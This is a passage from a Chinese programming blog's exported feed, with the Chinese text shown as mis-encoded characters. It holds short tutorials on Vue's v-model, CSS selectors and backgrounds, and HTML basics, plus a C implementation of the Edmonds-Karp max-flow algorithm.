å¼€å‘ç¯å¢ƒç‰ˆæœ¬ï¼ŒåŒ…å«äº†æœ‰å¸®åŠ©çš„å‘½ä»¤è¡Œè­¦å‘Š --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line">                students: [</span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"å¼ ä¸‰"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"æå››"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"ç‹äº”"</span> &#125;,</span></span><br><span class="line">                ],</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p>ä¾¿æ·åœ°è®¾ç½®å’Œè·å–è¡¨å•å…ƒç´ çš„å€¼ï¼Œå®ƒå¯ä»¥å°†æŸä¸ªç‰¹å®šçš„å€¼å’Œè¡¨å•å…ƒç´ çš„å€¼ç›¸å…³è”ï¼Œè¿™ç§å…³è”æ˜¯åŒå‘çš„ï¼š</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span> @<span class="attr">keydown.enter</span>=<span class="string">"setNewMsg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">""</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        setNewMsg:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.message = <span class="string">"é€šè¿‡vueæ”¹å˜message"</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="number">66</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Vueåˆçº§</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>ekç®—æ³•å®ç°æœ€å¤§æµé—®é¢˜</title>
    <url>/2020/05/30/ek%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%9C%80%E5%A4%A7%E6%B5%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>æœ€å¤§æµé—®é¢˜çš„è§£å†³æ–¹æ³•ä¸€èˆ¬æ˜¯åˆ©ç”¨<code>Ford-Fulkerson</code>ç®—æ³•ï¼Œè¯¥ç®—æ³•ä¼ªç å¦‚ä¸‹:<a id="more"></a></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> each <span class="title">edge</span> (<span class="params">u, v</span>) âˆˆ E <span class="keyword">do</span></span></span><br><span class="line"><span class="function">	f[u, v]â†0</span></span><br><span class="line"><span class="function">	f[v, u]â†0</span></span><br><span class="line"><span class="function">end <span class="keyword">for</span></span></span><br><span class="line"><span class="function"><span class="keyword">while</span> there exists a path P <span class="keyword">from</span> s to t <span class="keyword">in</span> the residual network Gf</span></span><br><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">	<span class="title">cf</span> (<span class="params">P</span>)â†mineâˆˆP</span> &#123;cf (e)&#125;</span><br><span class="line">	<span class="function"><span class="keyword">for</span> each <span class="title">edge</span> (<span class="params">u, v</span>) âˆˆ P <span class="keyword">do</span></span></span><br><span class="line"><span class="function">		f[u, v]â†f[u, v] + <span class="title">cf</span> (<span class="params">P</span>)</span></span><br><span class="line"><span class="function">		f[v, u]â† âˆ’ f[u, v]</span></span><br><span class="line"><span class="function">	end <span class="keyword">for</span></span></span><br><span class="line"><span class="function">end <span class="keyword">while</span></span></span><br></pre></td></tr></table></figure>

<p>è€Œekç®—æ³•æ˜¯å¯¹<code>Ford-Fulkerson</code>æ–¹æ³•çš„å®ç°ï¼ŒåŸºäºBFSã€‚ </p>
<p>ç½‘ä¸Šä¹Ÿæœ‰è®¸å¤šå¾ˆå¥½çš„æ¨¡æ¿ï¼š</p>
<p><a href="https://blog.csdn.net/jaster_wisdom/article/details/50942351" target="_blank" rel="noopener">æœ€å¤§æµé—®é¢˜(EKç®—æ³•æ¨¡æ¿)</a></p>
<p><a href="https://blog.csdn.net/creatorx/article/details/72629583" target="_blank" rel="noopener">HDU1532(æœ€å¤§æµEKç®—æ³•æ¨¡æ¿é¢˜)</a></p>
<p>æˆ‘è‡ªå·±ä¹Ÿå†™äº†ä¸€ä¸ªï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-30 14:55:40</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-30 17:26:38</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\others\maxFlow.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 10001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a, b) a &lt; b ? a : b</span></span><br><span class="line"><span class="keyword">int</span> capacity[MAXLEN][MAXLEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// è®°å½•è·¯å¾„ä¸Šçš„å‰é©±ï¼Œç”¨äºæ·»åŠ åå‘è¾¹</span></span><br><span class="line"><span class="keyword">int</span> pre[MAXLEN];</span><br><span class="line"><span class="keyword">int</span> vertexNum, arcNum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> <span class="built_in">end</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= vertexNum; i++) pre[i] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> flow[vertexNum + <span class="number">1</span>], <span class="built_in">queue</span>[vertexNum + <span class="number">1</span>], front = <span class="number">0</span>, rear = <span class="number">0</span>;</span><br><span class="line">    flow[start] = <span class="number">32767</span>;</span><br><span class="line">    <span class="comment">// æºç‚¹è¿›é˜Ÿåˆ—</span></span><br><span class="line">    <span class="built_in">queue</span>[++rear] = start;</span><br><span class="line">    <span class="keyword">while</span> (front != rear) &#123;</span><br><span class="line">        <span class="keyword">int</span> frontIndex = <span class="built_in">queue</span>[++front];</span><br><span class="line">        <span class="keyword">if</span> (frontIndex == <span class="built_in">end</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= vertexNum; i++) &#123;</span><br><span class="line">            <span class="comment">// å­˜åœ¨æœ‰å‘è¾¹å¹¶ä¸”ç‚¹iæ²¡æœ‰è¢«è®¿é—®è¿‡</span></span><br><span class="line">            <span class="keyword">if</span> (i != start &amp;&amp; capacity[frontIndex][i] &gt; <span class="number">0</span> &amp;&amp; pre[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">                pre[i] = frontIndex;</span><br><span class="line">                flow[i] = <span class="built_in">min</span>(capacity[frontIndex][i], flow[frontIndex]);</span><br><span class="line">                <span class="built_in">queue</span>[++rear] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ®‹ä½™ç½‘ç»œä¸­ä¸å­˜åœ¨å¢å¹¿è·¯</span></span><br><span class="line">    <span class="keyword">if</span> (pre[<span class="built_in">end</span>] == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> flow[<span class="built_in">end</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getMaxFlow</span><span class="params">(<span class="keyword">int</span> S, <span class="keyword">int</span> T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minF, preIndex, th, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((minF = BFS(S, T)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// æ›´æ–°æ®‹ç•™ç½‘ç»œ</span></span><br><span class="line">        th = T;</span><br><span class="line">        preIndex = pre[th];</span><br><span class="line">        <span class="keyword">while</span> (preIndex != <span class="number">-1</span>) &#123;</span><br><span class="line">            capacity[th][preIndex] += minF;</span><br><span class="line">            capacity[preIndex][th] -= minF;</span><br><span class="line">            th = preIndex;</span><br><span class="line">            preIndex = pre[th];</span><br><span class="line">        &#125;</span><br><span class="line">        sum += minF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> SVertex, TVertex;</span><br><span class="line">    <span class="comment">// printf("è¯·è¾“å…¥ç‚¹çš„ä¸ªæ•°å’Œæœ‰å‘è¾¹çš„ä¸ªæ•°ä»¥åŠæºç‚¹æ±‡ç‚¹ç¼–å·ï¼š\n");</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d"</span>, &amp;vertexNum, &amp;arcNum, &amp;SVertex, &amp;TVertex);</span><br><span class="line">    <span class="comment">// printf("è¯·ä¾æ¬¡è¾“å…¥æ¯æ¡æœ‰å‘è¾¹çš„å®¹é‡ï¼Œæ ¼å¼ä¸º 1 2 3ï¼š\n");</span></span><br><span class="line">    <span class="keyword">int</span> u, v, c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= arcNum; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;u, &amp;v, &amp;c);</span><br><span class="line">        <span class="comment">// æœ‰å¯èƒ½è¾“å…¥é‡å¤è¾¹</span></span><br><span class="line">        capacity[u][v] += c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, getMaxFlow(SVertex, TVertex));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4 6 1 4</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">1 4 20</span></span><br><span class="line"><span class="comment">1 2 10</span></span><br><span class="line"><span class="comment">3 4 50</span></span><br><span class="line"><span class="comment">3 2 30</span></span><br><span class="line"><span class="comment">2 4 40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>BFS</tag>
        <tag>æœ€å¤§æµ</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS è¯­æ³•ä¸€</title>
    <url>/2020/03/08/css-%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> åœ¨ç½‘é¡µè®¾è®¡ä¸­ï¼Œå¾€å¾€ä¼šåˆ©ç”¨åˆ°HTMLä¸CSSçš„ç»“åˆï¼ŒHTMLæ˜¯å®ç°å¤§è‡´æ¡†æ¶çš„ï¼Œè€ŒCSSåˆ™æ˜¯ä¸ºHTMLæ¡†æ¶è®¾ç½®æƒ³è¦è®¾å®šçš„æ ·å¼å±æ€§ï¼Œä¸¤è€…ç›¸ç»“åˆå¯ä»¥å®Œæ•´çš„ç”Ÿæˆå‡ºç›¸åº”çš„é™æ€ç½‘é¡µã€‚ ç®€å•è¯´ï¼Œ HTMLè¿›è¡Œå¸ƒå±€ï¼ŒCSSè¿›è¡Œé¡µé¢çš„ç¾åŒ– ï¼Œå³HTMLæŒ‡æ˜æœ‰ä»€ä¹ˆï¼ŒCSSæŒ‡æ˜æ€ä¹ˆæ”¾ã€‚</p>
<h2 id="åˆ›å»ºCSSæ–¹æ³•"><a href="#åˆ›å»ºCSSæ–¹æ³•" class="headerlink" title="åˆ›å»ºCSSæ–¹æ³•"></a>åˆ›å»ºCSSæ–¹æ³•</h2><ol>
<li><p>ä½¿ç”¨å…ƒç´ å†…åµŒæ ·å¼è¡¨</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>HTMLåŸç”Ÿè¶…é“¾æ¥<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span> <span class="attr">style</span>=<span class="string">"font-size: 40px;"</span>&gt;</span>CSSä¿®é¥°è¶…é“¾æ¥<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span> <span class="attr">style</span>=<span class="string">"font-size: 40px; color: #ff0000;"</span>&gt;</span>æœ‰é¢œè‰²çš„è¶…é“¾æ¥<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>
</li>
<li><p>ä½¿ç”¨æ–‡æ¡£å†…åµŒæ ·å¼è¡¨</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">a</span> &#123; <span class="comment">/* æ‰€æœ‰çš„aæ ‡ç­¾éƒ½æ˜¯è¿™ä¸ªæ ·å¼ */</span></span></span><br><span class="line">            color: coral;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>css1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>æ–‡æ¡£å†…åµŒCSSè¶…é“¾æ¥<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>â€‹    <strong>æ³¨æ„ä¸Šé¢headä¸‹é¢çš„styleæ ‡ç­¾ï¼Œå®ƒæ˜¯å†…åµŒåˆ°äº†æ–‡æ¡£ä¸­ï¼Œå®ƒå®šä¹‰äº†æ‰€æœ‰aæ ‡ç­¾çš„æ ·å¼</strong></p>
</li>
<li><p>ä½¿ç”¨å¤–éƒ¨æ ·å¼è¡¨</p>
<ul>
<li><p>æ–°å»ºä¸€ä¸ªa.cssæ–‡ä»¶</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">37</span>, <span class="number">0</span>, <span class="number">139</span>);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨HTMLæ–‡ä»¶ä¸­å¼•å…¥ä¸Šæ–‡çš„a.css</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"a.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>css1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ol>
<p>   è¿™ä¸‰ç§æ ·å¼æ˜¯æœ‰ä¼˜å…ˆçº§çš„ï¼Œè®°ä½ä»–ä»¬çš„ä¼˜å…ˆçº§ï¼šå…ƒç´ å†…è”å¼ &gt; æ–‡æ¡£å†…åµŒå¼ &gt; å¤–éƒ¨å¼ï¼Œä½†æ˜¯æ–‡æ¡£å†…åµŒå¼&gt;å¤–éƒ¨å¼æœ‰ä¸€ä¸ªå‰æï¼šæ–‡æ¡£å†…åµŒå¼cssæ ·å¼çš„ä½ç½®ä¸€å®šåœ¨å¤–éƒ¨å¼çš„åé¢ã€‚<br>   å…¶å®æ€»ç»“æ¥è¯´ï¼Œå°±æ˜¯â€“å°±è¿‘åŸåˆ™ï¼ˆç¦»è¢«è®¾ç½®å…ƒç´ è¶Šè¿‘ä¼˜å…ˆçº§åˆ«è¶Šé«˜ï¼‰ã€‚<br>   ä½†æ³¨æ„ä¸Šé¢æ‰€æ€»ç»“çš„ä¼˜å…ˆçº§æ˜¯æœ‰ä¸€ä¸ªå‰æï¼šå…ƒç´ å†…è”å¼ ã€æ–‡æ¡£å†…åµŒå¼ ã€å¤–éƒ¨å¼æ˜¯åœ¨çš„ç›¸åŒæƒå€¼çš„æƒ…å†µä¸‹ã€‚</p>
<h2 id="CSSåŸºæœ¬é€‰æ‹©å™¨"><a href="#CSSåŸºæœ¬é€‰æ‹©å™¨" class="headerlink" title="CSSåŸºæœ¬é€‰æ‹©å™¨"></a>CSSåŸºæœ¬é€‰æ‹©å™¨</h2><ul>
<li><p>é€‰æ‹©æ‰€æœ‰å…ƒç´ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style å…ƒç´ :*&#123;&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>æ ¹æ®ç±»å‹é€‰æ‹©å…ƒç´ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style å…ƒç´ :a&#123;&#125;</span><br><span class="line">bodyå…ƒç´ :&lt;a&gt;åšå®¢é“¾æ¥&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>æ ¹æ®ç±»é€‰æ‹©å…ƒç´ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style å…ƒç´ :.class_test&#123;&#125;</span><br><span class="line">bodyå…ƒç´ :&lt;a class &#x3D; &quot;class_test&quot;&gt;åšå®¢é“¾æ¥&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>æ ¹æ®IDé€‰æ‹©å…ƒç´ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style å…ƒç´ :#id_test&#123;&#125;</span><br><span class="line">bodyå…ƒç´ :&lt;a id &#x3D; &quot;id_test&quot;&gt;åšå®¢é“¾æ¥&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>æ ¹æ®å±æ€§é€‰æ‹©å…ƒç´ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style å…ƒç´ :[href]&#123;&#125;</span><br><span class="line">bodyå…ƒç´ :&lt;a href &#x3D; &quot;https:&#x2F;&#x2F;yalexin.gitee.io&#x2F;&quot;&gt;åšå®¢é“¾æ¥&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>:é€‰æ‹©å™¨åŠ¨ä½œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style å…ƒç´ :a:hover&#123;&#125;</span><br><span class="line">bodyå…ƒç´ :&lt;a&gt;åšå®¢é“¾æ¥&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p><strong>è¯´æ˜:</strong>é€‰æ‹©å™¨ä»…å‡ºç°åœ¨æ–‡æ¡£å†…åµŒæˆ–è€…å¤–éƒ¨æ ·å¼ä¸­ã€‚</p>
<p><strong>IDé€‰æ‹©å…ƒç´ ä¸ç±»é€‰æ‹©å…ƒç´ ï¼š</strong></p>
<ul>
<li>å…±åŒç‚¹ï¼šéƒ½å¯ä»¥ä½œä¸ºé€‰æ‹©å™¨ï¼Œæ”¹å˜å±æ€§å¤–é¢çš„å…ƒç´ çš„æ ·å¼ã€‚</li>
<li>ä¸åŒç‚¹ï¼šIDé€‰æ‹©å™¨åˆå«åšå”¯ä¸€é€‰æ‹©å™¨ï¼ŒIDæ˜¯å…ƒç´ çš„ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ï¼Œå³ä¸»é”®ã€‚å³åœ¨ç½‘é¡µä¸­æ¬¡IDå±æ€§å€¼ç¡®ä¿åªå‡ºç°ä¸€æ¬¡ï¼Œä¸èƒ½é‡å¤å‡ºç°ã€‚ç±»å±æ€§å¯ä»¥å¤šæ¬¡ä½¿ç”¨ï¼Œç”¨æˆ·æ ¹æ®éœ€è¦ï¼Œå°†éƒ¨åˆ†å…·æœ‰æŸç§ç‰¹å¾çš„å…ƒç´ é›†åˆå½’ä¸ºä¸€ç±»ï¼Œå¯å°†è¯¥ç±»å…ƒç´ è¡¨ç°å‡ºåŒä¸€æ•ˆæœï¼Œæ¯”å¦‚è¯´id=apple1çš„è‹¹æœã€id=apple2çš„è‹¹æœï¼Œid=banana1çš„é¦™è•‰ã€id=banana2çš„é¦™è•‰ï¼Œå®ƒä»¬éƒ½åŒå±äºæ°´æœç±»ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è®¾ç½®å®ƒä»¬çš„class=fruitã€‚</li>
</ul>
<h2 id="æ§åˆ¶èƒŒæ™¯"><a href="#æ§åˆ¶èƒŒæ™¯" class="headerlink" title="æ§åˆ¶èƒŒæ™¯"></a>æ§åˆ¶èƒŒæ™¯</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class_test</span> &#123;</span><br><span class="line">    <span class="attribute">background-attachment</span>:local;<span class="comment">/* å›ºå®šæ–¹å¼ */</span></span><br><span class="line">    <span class="attribute">background-size</span>: auto;</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;<span class="comment">/* é‡å¤æ–¹å¼ */</span></span><br><span class="line">    <span class="attribute">background-color</span>: brown;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(hello.png);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WebåŸºç¡€</category>
      </categories>
      <tags>
        <tag>CSSåŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>htmlè¯­æ³•ä¸€</title>
    <url>/2020/03/07/html%E8%AF%AD%E6%B3%951/</url>
    <content><![CDATA[<h2 id="æœ€ç®€å•çš„meno"><a href="#æœ€ç®€å•çš„meno" class="headerlink" title="æœ€ç®€å•çš„meno"></a>æœ€ç®€å•çš„meno</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span><span class="comment">&lt;!-- æ–‡æ¡£ä¸­htmlå¼€å§‹çš„éƒ¨åˆ† --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="comment">&lt;!-- æä¾›æœ‰å…³æ–‡æ¡£å†…å®¹å’Œæ ‡æ³¨ä¿¡æ¯ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span><span class="comment">&lt;!-- ç¼–ç  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        hello world</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="comment">&lt;!-- æ–‡æ¡£ä¸­htmlçš„ç»“æŸ --&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>HTMLå¸¸ç”¨çš„æ ‡ç­¾åˆ†ä¸ºï¼šè¡Œæ ‡ç­¾å’Œå—æ ‡ç­¾ï¼š</p>
<ul>
<li>è¡Œæ ‡ç­¾ï¼š åœ¨ä¸€è¡Œå†…æ˜¾ç¤ºã€ä¸å¯ä»¥è¿›è¡Œå®½é«˜çš„æ•°å€¼è®¾å®šï¼› </li>
<li>å—æ ‡ç­¾ï¼š ç‹¬è‡ªå é¢†ä¸€è¡Œã€å¯ä»¥è¿›è¡Œå®½é«˜çš„æ•°å€¼çš„è®¾å®šï¼› </li>
</ul>
<p>å…ˆä»‹ç»è¡Œæ ‡ç­¾</p>
<h2 id="è¡Œæ ‡ç­¾"><a href="#è¡Œæ ‡ç­¾" class="headerlink" title="è¡Œæ ‡ç­¾"></a>è¡Œæ ‡ç­¾</h2><h3 id="è¶…é“¾æ¥æ ‡ç­¾"><a href="#è¶…é“¾æ¥æ ‡ç­¾" class="headerlink" title="è¶…é“¾æ¥æ ‡ç­¾"></a>è¶…é“¾æ¥æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>åšå®¢é“¾æ¥<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!-- URLå¤–éƒ¨é“¾æ¥ --&gt;</span></span><br></pre></td></tr></table></figure>

